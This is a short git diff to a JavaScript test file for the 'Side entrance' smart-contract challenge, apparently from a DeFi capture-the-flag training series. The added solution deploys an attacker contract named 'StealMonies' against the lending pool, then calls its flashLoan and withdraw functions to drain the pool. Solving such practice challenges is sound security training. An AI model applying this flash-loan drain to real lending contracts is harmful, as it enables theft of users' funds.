@@ -26,6 +26,9 @@ describe('[Challenge] Side entrance', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        let stealMonies = await (await ethers.getContractFactory('StealMonies', player)).deploy(pool.address);
+        await stealMonies.flashLoan();
+        await stealMonies.withdraw();
     });
 
     after(async function () {
